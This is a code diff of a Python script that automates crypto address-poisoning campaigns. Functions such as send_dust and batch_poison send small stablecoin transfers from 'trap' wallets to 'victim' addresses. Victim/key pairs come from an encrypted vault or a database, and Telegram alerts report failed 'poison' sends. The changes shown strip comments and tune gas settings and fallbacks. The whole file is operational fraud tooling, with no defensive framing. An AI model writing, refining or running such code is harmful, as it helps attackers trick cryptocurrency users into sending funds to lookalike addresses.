@@ -3,7 +3,7 @@ import sys
 import os
 import re
 import time
-import argparse  # NEW
+import argparse
 from web3 import Web3
 from dotenv import load_dotenv
 
@@ -34,7 +34,7 @@ from lib.notifier import send_telegram
 from lib.shutdown import setup_graceful_shutdown
 from lib.encryption import decrypt
 
-# --- Supabase client for job tracking (NEW) ---
+# --- Supabase client for job tracking ---
 try:
     from supabase import create_client
 except ImportError:
@@ -186,17 +186,14 @@ PUBLIC_RPC_FALLBACKS = {
 }
 
 def get_web3():
-    # Helper lambda to safely extract config/env variables if defined
     get_var = lambda name: getattr(config, name, None) or os.getenv(name)
 
-    # Build ordered list: primary first, then public fallbacks
     raw_urls = [
         get_var("RPC_URL"),
         get_var("DUSTER_RPC_URL"),
         get_var("NODE_RPC_URL"),
     ] + getattr(config, "FALLBACK_RPC_URLS", []) + PUBLIC_RPC_FALLBACKS.get(CHAIN.lower(), [])
 
-    # Filter out None, empty strings, and duplicates while preserving order
     rpc_urls = list(dict.fromkeys([url for url in raw_urls if url]))
 
     print(f'[DEBUG] Trying {len(rpc_urls)} RPC URLs...')
@@ -204,13 +201,10 @@ def get_web3():
     for url in rpc_urls:
         try:
             print(f'[DEBUG] Connecting to {url}...')
-            
-            # Use HTTPProvider for connections
             provider = Web3.HTTPProvider(url, request_kwargs={'timeout': 10})
             w3 = Web3(provider)
 
             if w3.is_connected():
-                # Inject POA middleware if required for BSC/Polygon
                 if CHAIN.lower() in ('bsc', 'polygon') and geth_poa_middleware is not None:
                     try:
                         w3.middleware_onion.inject(geth_poa_middleware, layer=0)
@@ -231,7 +225,6 @@ print('[DEBUG] Web3 instance ready.')
 
 VAULT_FILE = config.VAULT_FILE
 
-# Minimal ERC-20 ABI
 ERC20_ABI = [
     {
         "constant": False,
@@ -249,7 +242,6 @@ ERC20_ABI = [
     },
 ]
 
-# --- Exponential Backoff & 429 Rate Limit Handling ---
 def call_with_retry(func, *args, max_attempts=3, base_delay=1, **kwargs):
     last_exc = None
     for attempt in range(1, max_attempts + 1):
@@ -280,7 +272,6 @@ def get_token_balance(address, token_symbol):
         return 0
 
 def choose_asset(victim, trap):
-    # Fetch balances for both USDC variants
     victim_usdc = get_token_balance(victim, "USDC")
     trap_usdc = get_token_balance(trap, "USDC")
     victim_usdc_native = get_token_balance(victim, "USDC_NATIVE")
@@ -291,7 +282,6 @@ def choose_asset(victim, trap):
     
     force_stable = os.getenv("FORCE_STABLECOIN_DUST", "").lower() == "true"
 
-    # USDC dust (both variants)
     if "USDC" in DUST_AMOUNT:
         dust_amount = DUST_AMOUNT["USDC"]
         if trap_usdc_native >= dust_amount and (victim_usdc_native > 0 or force_stable):
@@ -299,7 +289,6 @@ def choose_asset(victim, trap):
         if trap_usdc >= dust_amount and (victim_usdc > 0 or force_stable):
             return ("USDC", dust_amount)
 
-    # USDT dust
     if "USDT" in DUST_AMOUNT and trap_usdt >= DUST_AMOUNT["USDT"] and (victim_usdt > 0 or force_stable):
         return ("USDT", DUST_AMOUNT["USDT"])
 
@@ -335,15 +324,18 @@ def send_dust(private_key, victim_address, campaign_id=None):
         nonce = _local_nonces[trap]
 
         base_fee = call_with_retry(w3.eth.get_block, "latest")["baseFeePerGas"]
-        max_priority = w3.to_wei(config.GAS_PRIORITY_FEE_GWEI, "gwei")
-        max_fee = int((base_fee + max_priority) * config.GAS_FEE_BUFFER)
-        max_fee = min(max_fee, w3.to_wei(config.GAS_MAX_FEE_CAP_GWEI, "gwei"))
+        max_priority = w3.to_wei(getattr(config, 'GAS_PRIORITY_FEE_GWEI', 0.05), "gwei")
+        
+        fee_buffer = getattr(config, 'GAS_FEE_BUFFER', 1.15)
+        max_fee = int((base_fee + max_priority) * fee_buffer)
+        
+        max_fee_cap = getattr(config, 'GAS_MAX_FEE_CAP_GWEI', 500)
+        max_fee = min(max_fee, w3.to_wei(max_fee_cap, "gwei"))
         if max_priority > max_fee:
             max_priority = int(max_fee * 0.1)
 
         chain_id = w3.eth.chain_id
 
-        # --- Strict ERC-20 Processing ---
         token_addr = TOKEN_CONFIG.get(asset)
         if not token_addr:
             logger.error(f"Unknown token {asset}")
@@ -352,20 +344,19 @@ def send_dust(private_key, victim_address, campaign_id=None):
         token = w3.eth.contract(address=w3.to_checksum_address(token_addr), abi=ERC20_ABI)
         token_balance = call_with_retry(token.functions.balanceOf, trap).call()
         
-        # Abort immediately if balance dropped below dust amount
         if token_balance < dust:
             msg = f"⚠️ Insufficient {asset} balance in trap {trap} for victim {victim}. Need {dust}, have {token_balance}. Aborting."
             logger.warning(msg)
             send_telegram(msg, campaign_id=campaign_id)
             return False
 
-        # SAFE GAS ESTIMATION
+        # --- SAFE & OPTIMIZED GAS ESTIMATION ---
         try:
             estimated = call_with_retry(token.functions.transfer(victim, dust).estimate_gas, {'from': trap})
-            gas_limit = int(estimated * 1.2)
+            gas_limit = int(estimated * 1.05)  # Tight 5% safety buffer like batch_fund.py
         except Exception as e:
-            logger.warning(f"Gas estimation failed: {e}, using fallback 100000")
-            gas_limit = 100000
+            logger.warning(f"Gas estimation failed: {e}, using fallback 68000")
+            gas_limit = 68000
 
         tx = token.functions.transfer(victim, dust).build_transaction({
             "from": trap,
@@ -379,7 +370,6 @@ def send_dust(private_key, victim_address, campaign_id=None):
 
         native_balance = call_with_retry(w3.eth.get_balance, trap)
 
-        # --- Low‑balance alert ---
         MIN_RESERVE_NATIVE = float(os.getenv("MIN_RESERVE_NATIVE", "0.05"))
         threshold_wei = w3.to_wei(MIN_RESERVE_NATIVE, 'ether')
         now = time.time()
@@ -395,7 +385,6 @@ def send_dust(private_key, victim_address, campaign_id=None):
                 _last_low_balance_alert[trap] = now
                 logger.warning(alert_msg)
 
-        # --- Insufficient gas check ---
         if native_balance < required_eth:
             msg = f"⚠️ Insufficient {NATIVE_SYMBOL} for gas in trap {trap}. Need {w3.from_wei(required_eth, 'ether')}, have {w3.from_wei(native_balance, 'ether')}."
             logger.error(msg)
@@ -404,13 +393,9 @@ def send_dust(private_key, victim_address, campaign_id=None):
 
         signed = w3.eth.account.sign_transaction(tx, private_key)
         
-        # ─── FIX: Use rawTransaction (camelCase) for web3.py v6+ ───
-        try:
-            raw_tx = signed.rawTransaction
-        except AttributeError:
-            raw_tx = signed.raw_transaction  # fallback for older versions
+        # ─── FIX: Cross-version raw transaction byte extraction ───
+        raw_tx = getattr(signed, 'raw_transaction', getattr(signed, 'rawTransaction', None))
         
-        # SMART EXCEPTION CATCHING: Protect the local nonce
         try:
             tx_hash = w3.eth.send_raw_transaction(raw_tx)
             _local_nonces[trap] += 1 
@@ -442,7 +427,6 @@ def send_dust(private_key, victim_address, campaign_id=None):
         send_telegram(f"❌ Poison failed\nVictim: {victim_address}\nError: {e}", campaign_id=campaign_id)
         return False
 
-# --- Helper to read and decrypt vault lines ---
 def read_vault_lines(file_path):
     lines = []
     if not os.path.exists(file_path):
@@ -461,12 +445,7 @@ def read_vault_lines(file_path):
                 continue
     return lines
 
-# --- NEW: Fetch trap entries from database ---
 def get_trap_entries_from_db(campaign_id):
-    """
-    Fetches (victim_address, private_key) pairs from the traps table.
-    Returns a list of tuples (victim, private_key).
-    """
     entries = []
     if not supabase:
         logger.error("Supabase client not initialized.")
@@ -485,7 +464,6 @@ def get_trap_entries_from_db(campaign_id):
                 continue
             try:
                 private_key = decrypt(enc_key)
-                # Verify key works
                 w3.eth.account.from_key(private_key)
                 victim = row.get("victim_address", "").lower()
                 if victim:
@@ -499,7 +477,6 @@ def get_trap_entries_from_db(campaign_id):
     return entries
 
 def batch_poison(job_id=None, campaign_id=None):
-    # --- MODIFIED: Fetch from database if campaign_id provided, else vault ---
     if campaign_id:
         logger.info(f"Using database for campaign {campaign_id}")
         entries = get_trap_entries_from_db(campaign_id)
@@ -515,7 +492,6 @@ def batch_poison(job_id=None, campaign_id=None):
         if not decrypted_lines:
             logger.error("No valid (decrypted) entries found in vault.txt")
             return
-        # Parse vault entries
         entries = []
         for line in decrypted_lines:
             match = re.search(r"Victim:\s*(0x[a-fA-F0-9]{40}).*Key:\s*(0x[a-fA-F0-9]{64})", line, re.IGNORECASE)
@@ -530,7 +506,6 @@ def batch_poison(job_id=None, campaign_id=None):
         logger.error("No valid entries found")
         return
 
-    # Safe File I/O for cross-process reading (kept for caught file)
     CAUGHT_FILE = config.CAUGHT_FILE
     caught = set()
     if os.path.exists(CAUGHT_FILE):
@@ -577,7 +552,6 @@ def batch_poison(job_id=None, campaign_id=None):
 if __name__ == "__main__":
     setup_graceful_shutdown()
 
-    # Parse arguments: support --job-id and optional positional for single mode
     parser = argparse.ArgumentParser()
     parser.add_argument('--job-id', help='Job ID for tracking')
     parser.add_argument('private_key', nargs='?', help='Private key for single dust send')
@@ -590,12 +564,9 @@ if __name__ == "__main__":
         update_job(job_id, status='running')
         campaign_id = get_campaign_id_from_job(job_id)
     else:
-        # If not provided via job, try environment variable (used by re_poison.js)
         campaign_id = os.getenv('CAMPAIGN_ID')
 
     if args.private_key and args.victim_address:
-        # Single mode: just send dust and return
         send_dust(args.private_key, args.victim_address, campaign_id=campaign_id)
     else:
-        # Batch mode
         batch_poison(job_id=job_id, campaign_id=campaign_id)
